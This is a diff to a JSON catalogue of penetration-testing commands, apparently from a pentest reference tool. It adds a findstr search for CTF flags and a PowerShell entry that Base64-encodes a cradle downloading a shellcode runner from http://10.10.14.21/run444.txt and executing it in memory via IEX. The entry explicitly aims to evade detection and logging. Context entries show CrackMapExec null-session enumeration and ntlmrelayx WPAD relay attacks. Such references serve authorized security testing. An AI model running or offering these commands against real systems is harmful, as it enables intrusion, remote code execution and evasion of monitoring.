@@ -157,6 +157,26 @@
     "name": "Crackmapexec-Enum-LDAP"
   },
   {
+    "description": "The findstr command in Windows searches for text strings within files. It can be used during post-exploitation or CTF challenges to locate flags, credentials, or other sensitive data hidden in files.\n\nCommand Reference:\n```\nSearch String: \"RASTA{\"\n\nSearch Path: C:\\Users\\tquinn\\*.*\n\n/S \u2013 Search subdirectories recursively\n\n/M \u2013 Print only file names containing matches\n\n/C:\"text\" \u2013 Search for the exact string\n```\n",
+    "command": "findstr /S /M /C:\"RASTA{\" C:\\Users\\tquinn\\*.* \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr"
+    ],
+    "name": "findstr"
+  },
+  {
     "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate the SMB host using a null session. \n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
     "command": "crackmapexec smb 10.10.10.1 -u '' -p ''\n",
     "items": [
@@ -693,6 +713,28 @@
       "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami"
     ],
     "name": "whoami"
+  },
+  {
+    "description": "PowerShell supports executing Base64-encoded commands via the -EncodedCommand (-enc) flag. This is often used to obfuscate malicious commands, evade detection, and bypass command-line logging. An attacker encodes a PowerShell payload that downloads a remote script (run444.txt, a powershell shellcode runner) from a webserver and executes it in memory via Invoke-Expression (IEX). The encoded payload is then run using the powershell -enc syntax.\n\nCommand Reference:\n```\nCommand to be executed: New-Object System.Net.WebClient).DownloadString('http://10.10.14.21/run444.txt') | IEX\n```\n",
+    "command": "powershell -enc KABOAGUAdwAtAE8AYgBqAGUA...\n",
+    "code": "$text = \"(New-Object System.Net.WebClient).DownloadString('http://10.10.14.21/run444.txt') | IEX\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)\n$EncodedText = [Convert]::ToBase64String($bytes)\n$EncodedText\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV",
+      "Explotation"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://manage-the.cloud/2023/12/20/how-to-use-an-encoded-command-in-powershell/"
+    ],
+    "name": "powershell-enc"
   },
   {
     "description": "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled host. The command will then relay the authentication to create a new computer object and grant it delegation rights to impersonate users on the victim machine. This command should be used in conjunction with mitm6.\n\nCommand Reference:\n\n\tTarget Domain Controller: dc.test.local\n",
